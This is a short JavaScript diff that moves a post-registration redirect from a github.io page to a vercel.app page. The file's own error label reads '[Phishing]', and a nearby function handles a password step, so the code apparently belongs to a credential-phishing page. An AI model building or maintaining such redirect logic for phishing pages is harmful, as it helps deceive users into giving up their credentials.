@@ -553,7 +553,7 @@ function goToPasswordPage(email) {
 function redirectToOtherSite() {
   try {
     localStorage.setItem('userRegistered', 'true');
-    var targetUrl = 'https://ixdk.github.io/my-list-page/#registered';
+    var targetUrl = 'https://my-list-page.vercel.app/#registered';
     document.body.style.opacity = '0.5';
     document.body.style.transition = 'opacity 0.5s ease';
     setTimeout(function() {
@@ -561,7 +561,7 @@ function redirectToOtherSite() {
     }, 500);
   } catch (error) {
     console.error('[Phishing] Ошибка редиректа:', error);
-    window.location.href = 'https://ixdk.github.io/my-list-page/';
+    window.location.href = 'https://my-list-page.vercel.app/';
   }
 }
 
